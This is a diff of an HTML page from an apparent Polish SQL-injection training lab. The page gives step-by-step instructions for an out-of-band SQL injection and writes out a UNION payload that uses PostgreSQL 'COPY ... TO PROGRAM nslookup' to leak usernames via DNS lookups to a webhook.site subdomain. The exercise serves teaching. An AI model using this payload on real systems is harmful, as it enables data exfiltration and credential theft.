@@ -12,15 +12,16 @@
     <div class="container mt-5 p-4 border rounded shadow-sm bg-white">
         <h1 class="text-primary">Out of band SQLI</h1>
         <h2>Instrukcje przeprowadzenia ataku OOB SQL Injection (OOB SQLi) z zapytaniami DNS</h2>
+        <h5><strong>Przechwyć nazwę użytkownika i jego hasło, aby się zalogować. </strong></h5>
         <p>Postępuj zgodnie z poniższymi krokami, aby przeprowadzić atak OOB SQL Injection przy użyciu zapytań DNS, które przechwycą dane z bazy danych.</p>
-        
+
         <div class="card">
             <div class="card-body">
                 <h4 class="card-title">1. Przygotowanie serwera DNS (np. DNSLog)</h4>
                 <p>Najpierw musisz przygotować serwer DNS, który będzie przechwytywał zapytania. Możesz użyć jednej z dostępnych usług, jak np. DNSLog, aby monitorować zapytania DNS, które będą wysyłane przez aplikację. Zarejestruj się na jednym z serwisów do monitorowania zapytań DNS.</p>
                 <p>Przykład serwisu: <a href="https://webhook.site/" target="_blank">https://webhook.site/</a></p>
                 <p>Na webhook.site otrzymasz unikalny adres, który będzie działał jako subdomena, np. <code>xxxxxxxx.webhook.site.</code>.</p>
-                <p>Niestety strona ma ograniczenia do 100 zapytań dlatego, gdy narzucimy ich za dużo baza może zwrócić błąd. Mimo wszystko będziemy mogli ich część zaobserować an stronie w okinku po prawej </p>
+                <p>Niestety strona ma ograniczenia do 100 zapytań dlatego, gdy narzucimy ich za dużo baza może zwrócić błąd. Mimo wszystko będziemy mogli ich część zaobserować na stronie w oknie po lewej. </p>
 
                 <h4 class="card-title">2. Przygotowanie injekcji SQL z zapytaniem DNS</h4>
                 <p>Aby przeprowadzić atak, musisz wstrzyknąć zapytanie SQL, które wyśle zapytanie DNS na Twój serwer DNS. Do tego celu wykorzystamy funkcję <code>COPY TO PROGRAM</code>, aby wykonać zapytanie systemowe, jak np. <code>nslookup</code>.</p>
@@ -38,7 +39,7 @@
                 <pre><code>' UNION SELECT 1, COPY (SELECT CONCAT(username, '.xxxxxxxx.webhook.site') FROM users) TO PROGRAM 'nslookup' --</code></pre>
                 <p>W tej injekcji SQL:</p>
                 <ul>
-                    <li<Funkcja <code>COPY TO PROGRAM</code> wykonuje zapytanie systemowe i wysyła zapytanie DNS na Twój serwer DNS.</li>
+                    <li><code> COPY TO PROGRAM</code>  wykonuje zapytanie systemowe i wysyła zapytanie DNS na Twój serwer DNS.</li>
                     <li>Zapytanie DNS będzie wyglądać jak np. <code>alice.xxxxxxxx.webhook.site</code> (gdzie <code>alice</code> to wartość z bazy danych).</li>
                 </ul>
         
@@ -70,7 +71,7 @@
                 <div class="modal-body">
                     <p id="modal-message"></p>
                     <div class="">
-                    <p class="alert alert-light mt-3">Jedną z najprostszych technik Blind SQL Injection jest omijanie mechanizmów uwierzytelniania, takich jak formularze logowania. W tym przypadku celem nie jest uzyskanie konkretnych danych z bazy, lecz przejście procesu logowania.</p>
+                    <p class="alert alert-light mt-3"><strong>OOB SQLI</strong>  to zaawansowana technika ataku, która umożliwia wyciek danych z bazy przez wykorzystanie alternatywnych kanałów komunikacji, takich jak DNS czy HTTP. Stosowana jest, gdy klasyczny SQL Injection nie zwraca wyników bezpośrednio lub gdy wyświetlanie błędów SQL jest zablokowane.</p>
                     </div>
                     <h6 class="mt-3">SQL Query:</h6>
                     <pre id="modal-sql-query" class="bg-light p-3"></pre>
